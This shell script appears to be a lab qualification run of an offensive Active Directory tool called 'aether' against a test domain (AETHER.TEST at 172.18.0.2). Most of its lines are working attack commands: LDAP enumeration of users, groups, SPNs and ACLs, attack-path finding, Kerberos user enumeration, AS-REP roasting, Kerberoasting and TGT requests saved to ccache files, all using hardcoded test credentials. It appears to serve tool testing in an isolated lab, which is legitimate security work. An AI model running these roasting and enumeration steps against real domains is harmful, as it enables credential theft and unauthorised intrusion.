#!/bin/sh
# Stage 46g — Part C live qualification (in-network) — pass 3 (fixed binary /aether-fixed)
export AETHER_PASSPHRASE='Stage46gTest!'
OUT=/tmp/out2
mkdir -p "$OUT"
cd /tmp
A=/aether-fixed

$A ad ldap bind --host 172.18.0.2 \
  --bind-dn 'CN=Test User1,CN=Users,DC=aether,DC=test' \
  --bind-pass 'Passw0rd123!' --workspace ws1 > "$OUT/ldap-bind.txt" 2>&1
echo "EXIT-BIND=$?"

$A ad ldap rootdse --host 172.18.0.2 \
  --bind-dn 'CN=Test User1,CN=Users,DC=aether,DC=test' \
  --bind-pass 'Passw0rd123!' --workspace ws1 > "$OUT/ldap-rootdse.txt" 2>&1
echo "EXIT-ROOTDSE=$?"

for t in users groups computers ous spns; do
  $A ad ldap enum "$t" --dc 172.18.0.2 --domain AETHER.TEST \
    user1 'Passw0rd123!' --workspace ws1 > "$OUT/enum-$t.txt" 2>&1
  echo "EXIT-ENUM-$t=$?"
done
$A ad ldap enum all --dc 172.18.0.2 --domain AETHER.TEST \
  user1 'Passw0rd123!' --workspace ws1 > "$OUT/enum-all.txt" 2>&1
echo "EXIT-ENUM-ALL=$?"

$A ad ldap acl get --dc 172.18.0.2 --domain AETHER.TEST \
  --object 'CN=Test User4,CN=Users,DC=aether,DC=test' \
  user1 'Passw0rd123!' --workspace ws1 > "$OUT/acl-get.txt" 2>&1
echo "EXIT-ACL-GET=$?"
$A ad ldap acl effective --dc 172.18.0.2 --domain AETHER.TEST \
  --principal 'S-1-5-21-3443072978-3862387813-1790103675-1103' \
  --object 'CN=Test User4,CN=Users,DC=aether,DC=test' \
  user1 'Passw0rd123!' --workspace ws1 > "$OUT/acl-effective.txt" 2>&1
echo "EXIT-ACL-EFF=$?"
$A ad ldap path --dc 172.18.0.2 --domain AETHER.TEST \
  --start-user 'S-1-5-21-3443072978-3862387813-1790103675-1103' \
  --target 'CN=Test User4,CN=Users,DC=aether,DC=test' \
  user1 'Passw0rd123!' --workspace ws1 > "$OUT/acl-path.txt" 2>&1
echo "EXIT-PATH=$?"

printf 'administrator\nuser1\nuser2\nuser3\nuser4\nsvc_sql\nsvc_web\n' > "$OUT/users.txt"
$A ad enum users --dc 172.18.0.2 --domain AETHER.TEST \
  --userlist "$OUT/users.txt" --workspace ws1 > "$OUT/kerb-enum-users.txt" 2>&1
echo "EXIT-KERB-USERS=$?"
$A ad enum asrep --dc 172.18.0.2 --domain AETHER.TEST \
  --userlist "$OUT/users.txt" --workspace ws1 > "$OUT/kerb-enum-asrep.txt" 2>&1
echo "EXIT-KERB-ASREP=$?"
$A ad enum spn --dc 172.18.0.2 --domain AETHER.TEST \
  --workspace ws1 > "$OUT/kerb-enum-spn.txt" 2>&1
echo "EXIT-KERB-SPN=$?"
$A ad asreproast --dc 172.18.0.2 --domain AETHER.TEST \
  --userlist "$OUT/users.txt" --workspace ws1 > "$OUT/asreproast.txt" 2>&1
echo "EXIT-ASREPROAST=$?"
$A ad tgt --dc 172.18.0.2 --domain AETHER.TEST \
  --username user1 --password 'Passw0rd123!' --output /tmp/user1.ccache \
  --workspace ws1 > "$OUT/tgt.txt" 2>&1
echo "EXIT-TGT=$?"
$A ad kerberoast --dc 172.18.0.2 --domain AETHER.TEST \
  --spnlist "$OUT/spnlist.txt" --creds "$OUT/spncreds.txt" --workspace ws1 > "$OUT/kerberoast.txt" 2>&1
echo "EXIT-KERBEROAST=$?"

$A ad tgt --dc 172.18.0.2 --domain AETHER.TEST \
  --username user1 --ccache /tmp/user1.ccache --output /tmp/user1_rt.ccache \
  --workspace ws1 > "$OUT/ccache-rt.txt" 2>&1
echo "EXIT-CCACHE-RT=$?"
ls -la /tmp/*.ccache > "$OUT/ccache-list.txt" 2>&1
echo "=== DONE ==="
